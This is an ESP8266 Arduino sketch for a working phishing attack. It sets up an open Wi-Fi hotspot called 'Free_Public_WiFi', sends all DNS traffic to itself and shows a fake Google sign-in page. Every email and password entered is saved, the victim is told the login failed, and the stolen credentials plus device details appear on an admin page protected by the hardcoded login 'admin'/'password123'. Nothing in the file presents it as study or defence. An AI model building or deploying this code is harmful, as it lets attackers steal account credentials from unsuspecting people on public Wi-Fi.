#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

// Wi-Fi credentials for the fake network
const char* ssid = "Free_Public_WiFi";
const char* password = "";

// Admin credentials
const char* adminUsername = "admin";
const char* adminPassword = "password123";

// DNS and server objects
DNSServer dnsServer;
AsyncWebServer server(80);

// Data storage
String capturedCredentials = "";
String connectedDevices = "";
int totalLoginAttempts = 0;
int uniqueDevices = 0;

// Function to classify devices based on User-Agent, RSSI, and MAC address
String classifyDevice(String userAgent, int32_t rssi, String macAddress) {
  String deviceType;
  if (userAgent.indexOf("Android") > -1) deviceType = "Android Device";
  else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) deviceType = "iOS Device";
  else if (userAgent.indexOf("Windows") > -1) deviceType = "Windows Device";
  else if (userAgent.indexOf("Macintosh") > -1) deviceType = "MacOS Device";
  else if (userAgent.indexOf("Linux") > -1) deviceType = "Linux Device";
  else if (rssi > -50) deviceType = "Nearby Device";
  else if (rssi > -70) deviceType = "Medium Range Device";
  else deviceType = "Far Device";

  return deviceType + " | MAC: " + macAddress + " | RSSI: " + String(rssi) + " dBm";
}

// Generate the fake Google login page
String generateLoginPage(String errorMessage = "") {
  return R"rawliteral(
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sign in - Google Accounts</title>
      <style>
        body {
          font-family: Arial, sans-serif; background: #f5f5f5; margin: 0;
          display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .container {
          background: white; padding: 20px; border-radius: 10px;
          box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); text-align: center; max-width: 400px;
        }
        .logo svg {
          width: 75px; margin-bottom: 20px;
        }
        input {
          width: calc(100% - 20px); padding: 10px; margin: 10px 0;
          border: 1px solid #ccc; border-radius: 4px;
        }
        button {
          width: 100%; padding: 10px; background: #1a73e8; color: white; 
          border: none; border-radius: 4px; font-size: 16px; cursor: pointer;
        }
        button:hover { background: #1765c3; }
        .error { color: red; margin-bottom: 10px; font-size: 14px; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
            <path fill="#EA4335" d="M24 9.5c3.8 0 7.1 1.4 9.7 3.7l7.3-7.3C36.2 2.6 30.4 0 24 0 14.8 0 6.8 5.4 2.8 13.2l8.5 6.6C13.4 14 18.3 9.5 24 9.5z"/>
            <path fill="#34A853" d="M46.2 24.1c0-1.8-.2-3.5-.5-5.1H24v9.7h12.6c-.5 2.6-2 4.8-4.3 6.3l6.7 5.3c4.3-4 6.8-9.9 6.8-16.2z"/>
            <path fill="#4A90E2" d="M24 48c6.5 0 11.9-2.1 15.9-5.7l-7.7-6c-2.1 1.4-4.9 2.3-8.2 2.3-6.3 0-11.7-4.2-13.6-9.8l-8.5 6.7C6.6 42.7 14.7 48 24 48z"/>
            <path fill="#FBBC05" d="M10.4 29.8C9.6 27.7 9.1 25.4 9.1 23s.5-4.7"></path>
          </svg>
        </div>
        <form method="POST" action="/submit">
          <input type="email" name="email" placeholder="Email or phone" required>
          <input type="password" name="password" placeholder="Enter your password" required>
          <button type="submit">Sign in</button>
        </form>
        )rawliteral" + (errorMessage != "" ? "<div class='error'>" + errorMessage + "</div>" : "") + R"rawliteral(
      </div>
    </body>
    </html>
  )rawliteral";
}

// Function to handle login form submissions
void handleLogin(AsyncWebServerRequest *request) {
  if (request->hasParam("email", true) && request->hasParam("password", true)) {
    String email = request->getParam("email", true)->value();
    String password = request->getParam("password", true)->value();
    totalLoginAttempts++;

    // Save credentials
    capturedCredentials += "Email: " + email + ", Password: " + password + "\n";

    request->redirect("/login?error=Invalid+credentials");
  } else {
    request->redirect("/login");
  }
}

// Function to capture device details
void captureDeviceDetails(AsyncWebServerRequest *request) {
  String userAgent = request->header("User-Agent");
  int32_t rssi = WiFi.RSSI();
  String macAddress = WiFi.softAPmacAddress();

  String deviceInfo = classifyDevice(userAgent, rssi, macAddress);
  connectedDevices += deviceInfo + "\n";
  uniqueDevices++;
}

// Function to generate the admin panel
String generateAdminPanel() {
  return R"rawliteral(
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Admin Panel</title>
      <style>
        body {
          font-family: Arial, sans-serif; background: #f5f5f5; margin: 0;
          padding: 20px;
        }
        table {
          width: 100%; border-collapse: collapse;
        }
        th, td {
          padding: 10px; border: 1px solid #ddd; text-align: left;
        }
        th {
          background: #1a73e8; color: white;
        }
      </style>
    </head>
    <body>
      <h1>Admin Panel</h1>
      <h2>Captured Credentials</h2>
      <pre>)rawliteral" + capturedCredentials + R"rawliteral(</pre>
      <h2>Connected Devices</h2>
      <pre>)rawliteral" + connectedDevices + R"rawliteral(</pre>
      <h3>Total Login Attempts: )rawliteral" + String(totalLoginAttempts) + R"rawliteral(</h3>
      <h3>Unique Devices: )rawliteral" + String(uniqueDevices) + R"rawliteral(</h3>
    </body>
    </html>
  )rawliteral";
}

// Setup the server and routes
void setup() {
  Serial.begin(115200);

  // Start Wi-Fi
  WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", WiFi.softAPIP());

  // Define routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    captureDeviceDetails(request);
    request->redirect("/login");
  });

  server.on("/login", HTTP_GET, [](AsyncWebServerRequest *request) {
    String error = request->hasParam("error") ? request->getParam("error")->value() : "";
    request->send(200, "text/html", generateLoginPage(error));
  });

  server.on("/submit", HTTP_POST, handleLogin);

  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (request->authenticate(adminUsername, adminPassword)) {
      request->send(200, "text/html", generateAdminPanel());
    } else {
      request->requestAuthentication();
    }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}
